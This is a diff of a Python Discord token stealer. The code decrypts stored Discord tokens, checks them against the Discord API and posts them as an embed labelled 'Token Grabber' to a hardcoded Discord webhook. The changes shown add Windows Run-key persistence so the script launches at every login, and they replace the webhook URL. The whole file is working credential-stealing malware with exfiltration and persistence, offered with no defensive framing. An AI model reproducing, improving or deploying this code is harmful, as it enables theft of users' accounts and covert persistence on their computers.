@@ -1,11 +1,18 @@
 import base64
 import json
 import os
+os.system("cls")
+os.system("title ")
 import re
 import requests
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
+import winreg
 
+RED = '\033[1;91m'
+WHITE = '\033[0m'
+BLUE = '\033[1;34m'
+GREEN = '\033[1;32m'
 
 def send_discord_token(webhook: str):
     class ExtractTokens:
@@ -75,9 +82,7 @@ def send_discord_token(webhook: str):
 
         def validate_token(self, token: str) -> bool:
             r = requests.get(self.base_url, headers={'Authorization': token})
-            if r.status_code == 200:
-                return True
-            return False
+            return r.status_code == 200
 
         def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
             iv = buff[3:15]
@@ -109,26 +114,48 @@ def send_discord_token(webhook: str):
                 return
 
             for token in self.tokens:
-                if self.send_webhook_message(f"```{token}```"):
-                    break  # Stop after successfully sending one message
+                if self.send_webhook_message(self.create_embed(token)):
+                    break  
 
-        def send_webhook_message(self, message: str) -> bool:
-            data = {
-                "content": message
+        def create_embed(self, token: str) -> dict:
+            embed = {
+                "username": "𝙏𝙤𝙠𝙚𝙣 𝙂𝙧𝙖𝙗𝙗𝙚𝙧",
+                "embeds": [
+                    {
+                        "title": "New Token! ",
+                        "description": f"**```{token}```**",
+                        "color": 0x139e8c,
+                        "footer": {
+                        "text": "ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤhttps://github.com/Ezo4kaXD" 
+                        }
+                    }
+                ]
             }
+            return embed
+
+        def send_webhook_message(self, embed: dict) -> bool:
             headers = {
                 "Content-Type": "application/json"
             }
             try:
-                response = requests.post(self.webhook, json=data, headers=headers)
-                return response.status_code == 204  # Check if message was successfully sent
-            except requests.exceptions.RequestException as e:
-                return False  # Ignore any exceptions, continue with program
+                response = requests.post(self.webhook, json=embed, headers=headers)
+                return response.status_code == 204 
+            except requests.exceptions.RequestException:
+                return False  
+
 
     uploader = UploadTokens(webhook)
     uploader.upload()
 
-# Пример использования:
+def autorunREG(app_name, app_path=None):
+    if app_path is None:
+        app_path = os.path.abspath(__file__)  
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
+    winreg.CloseKey(key)
+
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/1262863231144431616/ElhJlcIhOgkH77BgvpQReqMqSpoOGpnBZbxdeX1LyvMyfT3c3uyP42NsZ1OfyTMRYWMF"
+    app_name = os.path.basename(__file__)  
+    autorunREG(app_name)
+    webhook_url = f"https://discord.com/api/webhooks/1286539115273130034/0SQfkek4siwXUiNRYu1gwJrBJ3epMEGl40GcQAzCvBIfOCsmogGJDiHzJ8ef3pmx2Ld6"
     send_discord_token(webhook_url)
